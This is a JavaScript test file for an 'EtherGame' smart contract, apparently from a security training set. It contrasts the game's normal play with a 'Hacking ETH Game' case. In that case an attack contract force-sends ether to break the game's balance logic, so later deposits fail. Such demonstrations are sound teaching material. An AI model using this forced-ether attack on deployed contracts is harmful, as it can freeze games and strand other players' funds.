
// ###################################################################################      Functions for converting uint format to decimal and vice versa
function amount_In_filter(n) {
    return web3.utils.toWei(n.toString(), "ether");
  }
  
  function amount_Out_filter(n) {
    return web3.utils.fromWei(n.toString(), "ether");
  }
  
// ###################################################################################  

const EtherGame = artifacts.require("EtherGame");
const Attack_ForceETH = artifacts.require("Attack_ForceETH");

contract("H_2_ForceETH.test.js", () => {
    let Victim;
    let Attack;

  beforeEach(async () => {
    const accounts = await web3.eth.personal.getAccounts();
    Victim = await EtherGame.new();
    Attack = await Attack_ForceETH.new(Victim.address, {from: accounts[9]});
  });

  it("Expected behaviour of ETH Game", async () => {
    const accounts = await web3.eth.personal.getAccounts();
    const expected_winner = accounts[3];

    console.log('-------------------------------------------------------------------------------');
    console.log(`ETHGame balance: ${amount_Out_filter(await web3.eth.getBalance(Victim.address))}`)
    console.log(`Game winner:   ${await Victim.winner()}`);
    console.log(" ");

    console.log('-------------------------------------------------------------------------------');
    console.log("Game deposits: ");
    await Victim.deposit({value: amount_In_filter(1), from: accounts[1]});
    await Victim.deposit({value: amount_In_filter(1), from: accounts[2]});
    await Victim.deposit({value: amount_In_filter(1), from: accounts[3]});
    console.log(" ");
    
    console.log('-------------------------------------------------------------------------------');
    console.log(`ETHGame balance: ${amount_Out_filter(await web3.eth.getBalance(Victim.address))}`)
    console.log(`Game winner:   ${await Victim.winner()}`);
    console.log(" ");

    console.log('-------------------------------------------------------------------------------');
    console.log(`Balance of expected winner before after win: ${amount_Out_filter(await web3.eth.getBalance(expected_winner))}`);
    console.log("Withdraw reward:")
    await Victim.claimReward({from: expected_winner});
    console.log(" ");

    console.log('-------------------------------------------------------------------------------');
    console.log(`ETHGame balance: ${amount_Out_filter(await web3.eth.getBalance(Victim.address))}`)
    console.log(`Game winner:   ${await Victim.winner()}`);
    console.log(`Balance of expected expected winner after win: ${amount_Out_filter(await web3.eth.getBalance(expected_winner))}`);
    console.log(" ");
  });

  it("Hacking ETH Game", async () => {
    const accounts = await web3.eth.personal.getAccounts();

    console.log('-------------------------------------------------------------------------------');
    console.log(`ETHGame balance: ${amount_Out_filter(await web3.eth.getBalance(Victim.address))}`)
    console.log(`Game winner:   ${await Victim.winner()}`);
    console.log(" ");

    console.log('-------------------------------------------------------------------------------');
    console.log("Game deposits: ");
    await Victim.deposit({value: amount_In_filter(1), from: accounts[1]});
    await Victim.deposit({value: amount_In_filter(1), from: accounts[2]});
    console.log(" ");

    console.log('-------------------------------------------------------------------------------');
    console.log(`ETHGame balance: ${amount_Out_filter(await web3.eth.getBalance(Victim.address))}`)
    console.log(`Game winner:   ${await Victim.winner()}`);
    console.log(" ");

    console.log('-------------------------------------------------------------------------------');
    console.log("Hacking the game: ");
    await Attack.attack({value: amount_In_filter(2), from: accounts[9]});
    console.log(" ");

    console.log('-------------------------------------------------------------------------------');
    console.log(`ETHGame balance: ${amount_Out_filter(await web3.eth.getBalance(Victim.address))}`)
    console.log(`Game winner:   ${await Victim.winner()}`);
    console.log(" ");
    
    console.log('-------------------------------------------------------------------------------');
    console.log("Game deposits: ");
    await Victim.deposit({value: amount_In_filter(1), from: accounts[3]});  // Because of the ETHGame balance is greater than 3, this line triggers an error.
    console.log(" ");
  
  });
});